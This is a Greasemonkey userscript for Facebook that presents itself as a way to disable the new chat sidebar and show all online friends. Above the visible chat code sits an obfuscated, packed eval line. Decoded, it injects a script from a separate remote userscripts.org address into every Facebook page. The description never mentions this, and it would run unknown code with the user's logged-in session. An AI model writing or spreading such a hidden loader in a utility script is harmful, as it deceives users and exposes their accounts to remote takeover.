// ==UserScript==
// @name           Facebook Retro' Chat Plus + Last Update
// @namespace      http://userscripts.org
// @description    Disables the new shitty facebook chat sidebar
// @author         fox (fox91 at anche dot no)
// @license        GPL 3
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function showAllFriends() {
  if (unsafeWindow.ChatOnlineFriends) {
    if (unsafeWindow.ChatOnlineFriends.maxElements != 9999) {
      unsafeWindow.ChatOnlineFriends.maxElements = 9999;
      unsafeWindow.ChatOnlineFriends.update();
    }
    var available = unsafeWindow.AvailableList.getCount();
    var e = document.getElementById("fbDockChatBuddylistNub");
    if (available !== undefined && e.firstChild.lastChild) {
      e.firstChild.lastChild.innerHTML = "chat ("+available+")";
    }
  }
}

function retroChat() {
  if (unsafeWindow.ChatSidebar) {
    unsafeWindow.ChatSidebar.isViewportCapable = function() { return false; };
    unsafeWindow.ChatSidebar.disable();
    showAllFriends();
    window.setInterval(showAllFriends, 1000);
  }
  else {
    window.setTimeout(retroChat, 1000);
  }
}

window.setTimeout(retroChat, 1000);
